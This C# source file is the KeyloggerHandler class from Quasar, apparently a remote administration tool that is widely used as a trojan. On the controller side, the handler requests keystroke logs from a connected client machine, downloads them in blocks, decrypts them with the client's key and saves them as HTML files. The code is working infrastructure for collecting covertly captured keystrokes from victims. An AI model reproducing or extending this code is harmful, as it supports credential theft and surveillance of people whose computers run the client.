using Quasar.Common.Helpers;
using Quasar.Common.IO;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using Quasar.Server.Networking;
using System;
using System.IO;

namespace Quasar.Server.Messages
{
    public class KeyloggerHandler : MessageProcessorBase<string>
    {
        /// <summary>
        /// The client which is associated with this keylogger handler.
        /// </summary>
        private readonly Client _client;

        /// <summary>
        /// Path to the base download directory of the client.
        /// </summary>
        private readonly string _baseDownloadPath;

        /// <summary>
        /// Initializes a new instance of the <see cref="KeyloggerHandler"/> class using the given client.
        /// </summary>
        /// <param name="client">The associated client.</param>
        public KeyloggerHandler(Client client) : base(true)
        {
            _client = client;
            _baseDownloadPath = Path.Combine(client.Value.DownloadDirectory, "Logs\\");
        }

        /// <inheritdoc />
        public override bool CanExecute(IMessage message) => message is GetKeyloggerLogsResponse;

        /// <inheritdoc />
        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        /// <inheritdoc />
        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetKeyloggerLogsResponse logs:
                    Execute(sender, logs);
                    break;
            }
        }

        /// <summary>
        /// Retrieves the keylogger logs and begins downloading them.
        /// </summary>
        public void RetrieveLogs()
        {
            _client.Send(new GetKeyloggerLogs());
        }

        private void Execute(ISender client, GetKeyloggerLogsResponse message)
        {
            if (message.FileCount == 0)
            {
                OnReport("Ready");
                return;
            }

            // don't escape from download directory
            if (FileHelper.HasIllegalCharacters(message.Filename))
            {
                // disconnect malicious client
                client.Disconnect();
                return;
            }

            if (!Directory.Exists(_baseDownloadPath))
                Directory.CreateDirectory(_baseDownloadPath);

            string downloadPath = Path.Combine(_baseDownloadPath, message.Filename + ".html");

            var destFile = new FileSplitLegacy(downloadPath);

            destFile.AppendBlock(message.Block, message.CurrentBlock);

            if (message.CurrentBlock + 1 == message.MaxBlocks)
            {
                try
                {
                    File.WriteAllText(downloadPath, FileHelper.ReadLogFile(downloadPath, _client.Value.EncryptionKey));
                }
                catch (Exception)
                {
                    OnReport("Failed to write logs");
                }

                if (message.Index == message.FileCount)
                {
                    OnReport("Ready");
                }
            }
        }

        protected override void Dispose(bool disposing)
        {
        }
    }
}
